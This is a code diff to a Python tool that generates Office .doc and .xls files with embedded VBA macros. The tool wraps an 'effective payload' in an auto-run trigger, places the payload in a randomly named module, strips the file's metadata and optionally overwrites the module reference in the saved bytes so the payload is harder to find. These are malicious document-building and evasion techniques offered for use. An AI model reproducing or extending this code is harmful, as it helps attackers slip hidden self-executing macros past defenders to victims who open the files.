@@ -11,7 +11,7 @@ def return_file_type(template_file):
         raise Info(template_file + " was not found.", 0)
 
     filename, file_extension = os.path.splitext(template_file)
-    if file_extension == ".doc" or (file_extension == ".xls") :
+    if file_extension == ".doc" or file_extension == ".xls":
         Info(file_extension + " detected", 0, 0)
         return file_extension
     else:
@@ -126,26 +126,43 @@ def main():
                 raise Info(auto_function_macro+ " is not supported yet, feel free to code it :-)",3)
 
             Info("Wrapping triggering function with auto_function_macro", 0,2)
-            final_vba = Office_container.generate_trigger_function(vba, auto_function_macro)
-           
-            Info("Removing VBA style",0,2)
-            final_vba = VBA_Func.remove_style(final_vba)
+            triggered_vba = Office_container.generate_trigger_function(vba, auto_function_macro)
 
-            Office_container.AddVba(final_vba)
+            Info("Removing VBA style",0,2)
+            triggered_vba = VBA_Func.remove_style(triggered_vba)
+            final_vba_nostyle = VBA_Func.remove_style(vba.getCurrentVba())
+
+            Info("Adding effective payload to a specific module and triggering function to the file",0,2)
+            random_module_name = random_value(7, string.ascii_letters)
+            Office_container.AddVba(final_vba_nostyle,random_module_name)
+            Office_container.AddVba(triggered_vba)
 
             Info("Removing all metadatas from file", 0,2)
             Office_container.Remove_Metadata()
 
             Info("Saving file", 0,2)
             Office_container.Save(path_gen_files + "\\" + filename, file_type)
+
         else:
             raise Info(key_hiding_method+ " is not supported yet, feel free to code it :-)",3)
 
+
+        
         Office_container.Close()
         Office_container.Quit()
         del Office_container
         del vba
-        Info("File "+filename + file_type+" was created succesfuly",1,1)
+
+        if (delete_module_name):
+            Info("Option delete module name activated, deleted reference to module containing effective payload",0,2)
+            with open(path_gen_files + "\\" + filename+file_type, "rb") as input_file: 
+                content = input_file.read()
+                if "Module="+random_module_name in content:
+                    content = content.replace("Module="+random_module_name, "\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d" )
+            with open(path_gen_files + "\\" + filename+file_type, "wb" ) as f:
+                f.write(content)        
+        
+        Info("File "+filename + file_type+" was created succesfuly",1,1)                     
 
     print "\n"
     Info("Good, everything seems ok, "+str(file_len(filename_list)) +" "+file_type+" files were created in "+path_gen_files+" using "+encryption_type+" encyption with "+key_hiding_method+" hiding technic", 1,0)
